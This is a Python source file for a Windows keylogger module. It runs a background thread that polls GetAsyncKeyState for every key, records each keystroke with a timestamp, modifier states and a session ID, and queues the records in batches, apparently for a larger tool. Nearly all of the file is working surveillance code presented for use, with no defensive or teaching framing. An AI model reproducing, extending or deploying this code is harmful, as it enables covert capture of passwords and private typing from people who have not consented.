"""
Keylogger Module
Captures and processes keystrokes
"""

import win32api
import win32con
import time
import threading
from datetime import datetime
from queue import Queue
import logging

class Keylogger:
    def __init__(self):
        self.running = False
        self.queue = Queue()
        self.session_id = Config.SESSION_ID
        self.key_count = 0
        self.modifier_map = {
            'shift': 0x10,
            'ctrl': 0x11,
            'alt': 0x12,
            'capslock': 0x14
        }
        
        self.special_keys = {
            0x08: '[BACKSPACE]',
            0x09: '[TAB]',
            0x0D: '[ENTER]',
            0x10: '[SHIFT]',
            0x11: '[CTRL]',
            0x12: '[ALT]',
            0x14: '[CAPS LOCK]',
            0x1B: '[ESC]',
            0x20: '[SPACE]',
            0x25: '[LEFT]',
            0x26: '[UP]',
            0x27: '[RIGHT]',
            0x28: '[DOWN]',
            0x2E: '[DELETE]',
            0x70: '[F1]',
            0x71: '[F2]',
            0x72: '[F3]',
            0x73: '[F4]',
            0x74: '[F5]',
            0x75: '[F6]',
            0x76: '[F7]',
            0x77: '[F8]',
            0x78: '[F9]',
            0x79: '[F10]',
            0x7A: '[F11]',
            0x7B: '[F12]'
        }
        
        logging.info("[*] Keylogger initialized")
    
    def start(self):
        """Start the keylogger"""
        if self.running:
            return
        
        self.running = True
        self.capture_thread = threading.Thread(target=self._capture_loop, daemon=True)
        self.capture_thread.start()
        
        logging.info("[✓] Keylogger started")
    
    def stop(self):
        """Stop the keylogger"""
        self.running = False
        logging.info("[✓] Keylogger stopped")
    
    def _capture_loop(self):
        """Main capture loop"""
        while self.running:
            for key_code in range(8, 256):
                if self.running and win32api.GetAsyncKeyState(key_code) & 0x1:
                    self._process_key(key_code)
            time.sleep(0.01)
    
    def _process_key(self, key_code):
        """Process a single keystroke"""
        # Get key name
        if key_code in self.special_keys:
            key_name = self.special_keys[key_code]
        else:
            key_name = chr(key_code) if 32 <= key_code <= 126 else None
        
        if key_name is None:
            return
        
        # Get modifier states
        modifiers = {
            'shift': bool(win32api.GetAsyncKeyState(self.modifier_map['shift']) & 0x8000),
            'ctrl': bool(win32api.GetAsyncKeyState(self.modifier_map['ctrl']) & 0x8000),
            'alt': bool(win32api.GetAsyncKeyState(self.modifier_map['alt']) & 0x8000),
            'capslock': bool(win32api.GetAsyncKeyState(self.modifier_map['capslock']) & 0x1)
        }
        
        # Decode with modifiers
        if modifiers['shift'] and key_name.isalpha():
            key_name = key_name.upper()
        
        # Create keystroke object
        keystroke = {
            'timestamp': datetime.now().isoformat(),
            'key': key_name,
            'key_code': hex(key_code),
            'modifiers': modifiers,
            'session_id': self.session_id,
            'is_special': key_code in self.special_keys
        }
        
        # Add to queue
        self.queue.put(keystroke)
        self.key_count += 1
        
        # Log if verbose
        logging.debug(f"Key: {key_name} | Modifiers: {modifiers}")
    
    def get_keystroke(self, timeout=1):
        """Get a keystroke from the queue"""
        try:
            return self.queue.get(timeout=timeout)
        except:
            return None
    
    def get_batch(self, max_items=100):
        """Get a batch of keystrokes"""
        batch = []
        while len(batch) < max_items and not self.queue.empty():
            try:
                item = self.queue.get_nowait()
                batch.append(item)
            except:
                break
        return batch
    
    def get_stats(self):
        """Get keylogger statistics"""
        return {
            'total_keystrokes': self.key_count,
            'queue_size': self.queue.qsize(),
            'running': self.running,
            'session_id': self.session_id
        }